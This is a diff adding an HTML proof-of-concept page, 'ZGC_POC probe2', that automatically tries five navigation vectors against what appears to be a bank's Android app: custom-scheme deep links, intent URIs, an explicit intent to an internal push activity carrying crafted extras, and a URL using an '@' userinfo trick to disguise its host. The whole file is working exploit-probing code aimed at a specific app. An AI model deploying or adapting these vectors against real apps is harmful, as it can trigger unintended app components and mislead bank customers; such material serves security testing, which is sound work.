@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>ZGC_POC probe2</title>
+<style>
+body { font-family: monospace; font-size: 15px; padding: 12px; }
+h2 { color: #c00; }
+pre { white-space: pre-wrap; word-break: break-all; background:#f4f4f4; padding:8px; border:1px solid #ccc; }
+</style>
+</head>
+<body>
+<h2>ZGC_POC probe2: scheme/intent navigation test</h2>
+<pre id="out">init...</pre>
+<script>
+var out = [];
+function log(s) {
+    out.push(s);
+    document.getElementById('out').textContent = out.join('\n');
+    document.title = 'P2[' + out.length + ']';
+}
+// 依次尝试的导航向量; 每个 3 秒一步, 页面记录尝试顺序
+var vectors = [
+    ['V1 zgcbank scheme goScene',
+     'zgcbank://dl/public/?channel=goScene'],
+    ['V2 myscheme goScene',
+     'myscheme://com.zgcbank.android?channel=goScene'],
+    ['V3 intent scheme',
+     'intent://dl/public/?channel=goScene#Intent;scheme=zgcbank;package=com.mobile.zgcbank;end'],
+    ['V4 intent component PushActivity opt=7 marketing',
+     'intent:#Intent;component=com.mobile.zgcbank/com.csii.madp.standard.push.PushActivity;S.custom=%7B%22opt%22%3A%227%22%2C%22channel%22%3A%22marketing%22%7D;S.title=P2V4;end'],
+    ['V5 marketfs https direct',
+     'https://app.zgcbank.com@marketfs.zgcbank.com/']
+];
+var idx = 0;
+function step() {
+    if (idx >= vectors.length) { log('[done] all vectors tried'); return; }
+    var v = vectors[idx++];
+    log('[try] ' + v[0]);
+    try {
+        window.location.href = v[1];
+        log('     location.href set ok');
+    } catch (e) {
+        log('     err: ' + e);
+    }
+    setTimeout(step, 3000);
+}
+log('[start] UA=' + navigator.userAgent.slice(0, 80));
+setTimeout(step, 1500);
+</script>
+</body>
+</html>
